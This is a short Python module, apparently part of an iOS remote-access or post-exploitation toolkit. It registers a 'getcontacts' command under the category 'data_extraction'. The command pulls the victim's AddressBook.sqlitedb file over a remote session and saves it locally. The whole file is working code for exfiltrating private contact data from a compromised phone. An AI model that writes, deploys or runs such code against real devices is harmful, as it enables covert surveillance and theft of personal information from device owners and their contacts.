import json
import os
import modules.helper as h


class command:
    def __init__(self):
        self.name = "getcontacts"
        self.description = "download addressbook"
        self.category = "data_extraction"

    def run(self, session, cmd_data):
        file_name = "AddressBook.sqlitedb"
        h.info_general("Downloading {0}".format(file_name))
        data = session.download_file('/var/mobile/Library/AddressBook/'+file_name)
        if data:
            h.info_general("Saving {0}".format(file_name))
            f = open(os.path.join('downloads', file_name), 'wb')
            f.write(data)
            f.close()
            h.info_general("Saved to ./downloads/{0}".format(file_name))
